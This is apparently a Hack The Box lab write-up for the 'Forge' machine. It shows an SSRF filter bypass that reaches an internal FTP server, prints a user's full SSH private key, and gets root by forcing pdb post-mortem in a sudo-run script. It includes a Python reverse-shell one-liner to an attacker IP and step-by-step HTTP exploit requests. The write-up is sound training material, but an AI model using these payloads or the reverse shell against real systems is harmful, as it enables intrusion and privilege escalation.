# [forge](https://app.hackthebox.eu/machines/Forge)

> A Ubuntu Linux box with a server-side request forgery vulnerability that allows an attacker to retrieve the user's private key from an internal FTP server. The user can execute a Python script as `root` that listens on a port for client input. If the attacker connects to this port and inputs an alphabetical string, the script will throw an exception and go into debugging mode, allowing the user to execute arbitrary commands as `root`.

---

## Open Port Discovery

```bash
$ masscan -p1-65535 10.129.220.19 --rate=1000 -e tun0 --output-format grepable --output-filename forge-tcp.masscan
$ cat forge-tcp.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p22,80 10.129.220.19 -oA forge
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 16:21 UTC
Nmap scan report for ip-10-129-220-19.us-east-2.compute.internal (10.129.220.19)
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 10.129.220.19; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds
```

OpenSSH string indicates the operating system is Ubuntu 20.04.

---

## Web Application Enumeration

### Virtual Host Discovery

```bash
$ gobuster vhost -u http://forge.htb -w /usr/share/wordlists/subdomains-top1million-5000.txt | grep 'Status: 200'
Found: admin.forge.htb (Status: 200) [Size: 27]
```

Found virtual host `admin.forge.htb`.

### `forge.htb`

#### Automated Content Discovery

```bash
$ gobuster dir -u http://forge.htb -w /usr/share/wordlists/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forge.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/14 16:37:47 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
/upload               (Status: 200) [Size: 929]                                
/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/] 
/.                    (Status: 200) [Size: 2050]                               
/server-status        (Status: 403) [Size: 274]                                
                                                                               
===============================================================
2021/09/14 16:44:15 Finished
===============================================================
```

#### Manual Enumeration

Attempting to browse to `http://10.129.220.19` redirects to `http://forge.htb`. Add this domain name / IP address pair to the local DNS resolver.

Landing page is a photo gallery.

![](images/Pasted%20image%2020210914162548.png)

The landing page contains a link to a photo upload feature.

![](images/Pasted%20image%2020210914162827.png)

The feature allows a client to upload a local file or a file from a URL.

#### Uploading a Local File

```http
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------355333516534881690141851027798
Content-Length: 5843
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

-----------------------------355333516534881690141851027798
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
Content-Type: application/x-php

<file contents>
-----------------------------355333516534881690141851027798
Content-Disposition: form-data; name="local"

1
-----------------------------355333516534881690141851027798--
```

#### Uploading a Remote File

```http
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F10.10.14.71%2Fblah.jpg&remote=1
```

After uploading a file, the web application returns a link to the file in the form of `http://forge.htb/uploads/$FILE_ID`. `$FILE_ID` is a 20 character long, seemingly random string of characters.

### `admin.forge.htb`

#### Manual Enumeration

The landing page:

![](images/Pasted%20image%2020210914173710.png)

The application indicates that it will only accept connections from `localhost`.

---

## Exploiting the File Upload Feature to Enumerate `admin.forge.htb`

### Enumeration via Server-Side Request Forgery

The remote file upload feature can be used to probe the `admin.forge.htb` virtual host. The back end application restricts any input that contains the string `forge.htb` and that doesn't begin with `http://` or `https://`.

#### Requesting `http://admin.forge.htb`

Upload from the URL `http://admin%2Eforge%2Ehtb` to bypass the application's restrictions.

![](images/Pasted%20image%2020210914174538.png)

The `%` is further URL-encoded in the actual request.

```http
POST /upload HTTP/1.1code
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2Fadmin%252Eforge%252Ehtb&remote=1
```

Follow the link to view the page's HTML:

```http
HTTP/1.1 200 OK
Date: Tue, 14 Sep 2021 17:40:28 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=5TTAWFULr5iXrgIviQN6
Content-Length: 559
Last-Modified: Tue, 14 Sep 2021 17:40:26 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg

<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

The source code contains links to `/announcements` and `/upload`.

#### Retrieving `http://admin.forge.htb/announcements`

```http
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2Fadmin%252Eforge%252Ehtb%2Fannouncements&remote=1
```

Follow the link.

```http
HTTP/1.1 200 OK
Date: Tue, 14 Sep 2021 17:56:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=DLY4xaAJ03XQJIyZos5P
Content-Length: 965
Last-Modified: Tue, 14 Sep 2021 17:56:47 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg

<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

The announcements indicate the following:
- FTP credentials `user:heightofsecurity123!`
	- Can't SSH as `user` (permission denied - key only)
- `http://admin.forge.htb/upload?u=$URL` will fetch the file at $URL (supports ftp, ftps, http, and https) 

#### Retrieving `http://admin.forge.htb/upload`

```http
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2Fadmin%252Eforge%252Ehtb%2Fupload&remote=1
```

Follow the link.

```http
HTTP/1.1 200 OK
Date: Tue, 14 Sep 2021 17:59:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=rUpdzKgJobY8d71BBDMM
Content-Length: 1031
Last-Modified: Tue, 14 Sep 2021 17:59:14 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg

<!DOCTYPE html>
<html>
<head>
    <title>Upload an image</title>
</head>
<body onload="show_upload_local_file()">
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/upload.css">
    <script type="text/javascript" src="/static/js/main.js"></script>
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <center>
        <br><br>
        <div id="content">
            <h2 onclick="show_upload_local_file()">
                Upload local file
            </h2>
            <h2 onclick="show_upload_remote_file()">
                Upload from url
            </h2>
            <div id="form-div">
                
            </div>
        </div>
    </center>
    <br>
    <br>
</body>
</html>
```

Identical functionality to `http://forge.htb/upload`.

---

## Server Side Request Forgery to Foothold

### Accessing Internal FTP Server

Since `http://admin.forge.htb/upload?u=$URL` will fetch a file from $URL where $URL can be ftp, ftps, http, or https and FTP credentials are known, it is possible to exploit the server-side request forgery vulnerability to query the FTP server.

On `http://forge.htb/upload`, upload with the remote URL `http://admin%2Eforge%2Ehtb/upload?u=ftp://user:heightofsecurity123!@admin%2Eforge%2Ehtb`.

```http
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2Fadmin%252Eforge%252Ehtb/upload%3Fu%3Dftp%3A%2F%2Fuser%3Aheightofsecurity123%21@admin%252Eforge%252Ehtb&remote=1
```

Follow the link.

```http
HTTP/1.1 200 OK
Date: Tue, 14 Sep 2021 18:15:20 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=YGKOCtXSPxrP7XUcFa9a
Content-Length: 126
Last-Modified: Tue, 14 Sep 2021 18:15:14 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg

drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 14 04:23 user.txt
```

An FTP directory. Since `user.txt` is in this directory, it is possible that it is the user's home directory. If this is the case, perhaps there is an `.ssh/` directory with the user's private key. Turns out, this is the case. Read the user's SSH private key.

```http
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: http://forge.htb
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2Fadmin%252Eforge%252Ehtb/upload%3Fu%3Dftp%3A%2F%2Fuser%3Aheightofsecurity123%21@admin%252Eforge%252Ehtb/.ssh/id_rsa&remote=1
```

Follow the link.

```http
HTTP/1.1 200 OK
Date: Tue, 14 Sep 2021 20:03:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Disposition: inline; filename=p4tYW0e1LlAzLO4DYnns
Content-Length: 2590
Last-Modified: Tue, 14 Sep 2021 20:03:52 GMT
Cache-Control: no-cache
Connection: close
Content-Type: image/jpg

-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

Use the private key to log in to `user`'s account.

```bash
ssh -i user_id_rsa user@10.129.220.19 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 14 Sep 2021 08:10:10 PM UTC

  System load:           0.08
  Usage of /:            43.7% of 6.82GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             219
  Users logged in:       0
  IPv4 address for eth0: 10.129.220.19
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7c1b


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 14 20:09:59 2021 from 10.10.14.71
user@forge:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

---

## Privilege Escalation

### Enumeration

```bash
$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

`user` is capable of running `/opt/remote-manage.py` with administrative privileges. The script:

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

The script opens up and socket and listens on a random port. When a client connects and enters the password `secretadminpassword`, they are prompted to view processes, free memory, listening sockets, or quit. When the client sends a command (an integer 1-4), the server executes `ps aux`, `df`, or `ss -lnt` respectively. When the client quits, the program exits.

### Exploitation

This script has a large `try` block and the `except` block executes the `pdf.post_mortem()` function. If this function is executed, the program will go into debugging mode, allowing the user to execute arbitrary Python commands. If executed with `sudo`, the Python commands will run with administrative privileges.

Note the way in which the script retrieves the user input and passes it straight into the `int()` function. If a string is passed in that can't be cast into an integer, an exception will be thrown and the program will enter debugging mode.

Start a listener on the attacking machine.

```bash
$ nc -nlvp 443
```

Run the script.

```bash
$ sudo /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:4392
```

In another shell on the target machine, connect to the script's socket, input the password `secretadminpassword`, and input the string `blah`.

```bash
$ nc -nv 127.0.0.1 4392
Connection to 127.0.0.1 4392 port [tcp/*] succeeded!
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
blah
```

This will cause the script to enter debugging mode. Execute a reverse shell in the debugging prompt.

```bash
$ sudo /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:4392
invalid literal for int() with base 10: b'blah'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.71",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Catch the shell.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.220.161] 37556
1
2
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag from `/root/root.txt`.
